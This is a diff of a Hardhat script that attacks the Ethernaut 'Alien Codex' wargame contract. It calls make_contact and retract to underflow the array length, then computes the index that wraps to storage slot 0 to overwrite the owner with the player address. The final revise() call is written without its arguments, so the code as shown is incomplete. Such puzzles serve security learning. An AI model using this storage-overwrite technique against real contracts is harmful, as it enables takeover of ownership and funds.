@@ -1,9 +1,10 @@
+import { AbiCoder } from "@ethersproject/abi";
 import { Wallet } from "ethers";
 import { ethers } from "hardhat";
 
 const attackAlienCodex = async () => {
     // change contract addresses here. change gas only if needed.
-    const alienCodexAddress = "0x0Da41194c379e212EFA9067A28945cF6a8Acb62D";
+    const alienCodexAddress = "0xF675Be946818f77Ba00aD069C99C97080800656E";
     const playerAddress = "0x3C4f1C7Ab126a94016CA8F4e770522810aa61954";
 
     // knowledge in opcode required to finish this level. To understand how to get bytecodes above, please
@@ -35,9 +36,27 @@ const attackAlienCodex = async () => {
     // const txReceipt1 = await tx1.wait(1);
     // console.log(txReceipt1);
     // const _solver = await txReceipt1.contractAddress;
-    // const ABI = ["function setSolver(address _solver)"];
-    // const contract = await ethers.getContractAt(ABI, magicNumberAddress);
-    // const tx2 = await contract.setSolver(_solver);
+    const ABI = [
+        "function make_contact()",
+        "function retract()",
+        "function revise(uint i, bytes32 _content) contacted public",
+    ];
+    const contract = await ethers.getContractAt(ABI, alienCodexAddress);
+    const tx1 = await contract.make_contact();
+    const tx1Receipt = await tx1.wait(1);
+    console.log(tx1Receipt);
+    const tx2 = await contract.retract();
+    const tx2Receipt = await tx2.wait(1);
+    console.log(tx2Receipt);
+    // note here
+    const abi = ethers.utils.defaultAbiCoder;
+    const params = abi.encode(["uint256"], [1]);
+    const position = await ethers.utils.keccak256(params);
+    // notes here
+    const i = BigInt(2 ** 256) - BigInt(position);
+    const _content = "0x" + "0".repeat(24) + playerAddress.slice(2);
+    const tx3 = await contract.revise();
+    const tx3Receipt = await tx3.wait(1);
     // const txReceipt = await tx2.wait(1);
     // console.log(txReceipt);
 };
